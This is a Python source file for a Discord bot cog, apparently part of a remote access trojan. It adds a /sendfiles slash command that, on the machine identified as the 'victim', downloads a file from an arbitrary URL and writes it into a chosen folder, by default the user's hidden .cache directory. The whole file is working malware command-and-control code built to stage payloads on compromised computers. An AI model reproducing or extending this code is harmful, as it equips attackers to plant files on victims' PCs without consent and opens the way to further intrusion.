import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class SendFiles(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @commands.slash_command( )
    async def sendfiles(self, ctx, victim, url, file_name, file_path=nr_working):
        """Send file to victim's PC

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        url: Direct link to the file for sending
        file_name: Name of the file after sending to PC
        file_path: Path to which the file should be saved
        """
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()

            if '"' in file_path:
                file_path = file_path.replace('"','')
            try: 
                os.chdir(file_path)
            except: 
                return await ctx.followup.send("Invalid directory!")

            try:
                r = requests.get(url, allow_redirects=True)
            except:
                return await ctx.followup.send("Invalid URL!")

            with open(file_name, "wb") as f: 
                f.write(r.content)

            await ctx.followup.send(
                embed=self.bot.genEmbed(
                    "File successfully sent to PC!",
                    datetime.now(),
                    f"File path: {file_path}",
                )
            )

def setup(bot: commands.Bot):
    bot.add_cog(SendFiles(bot))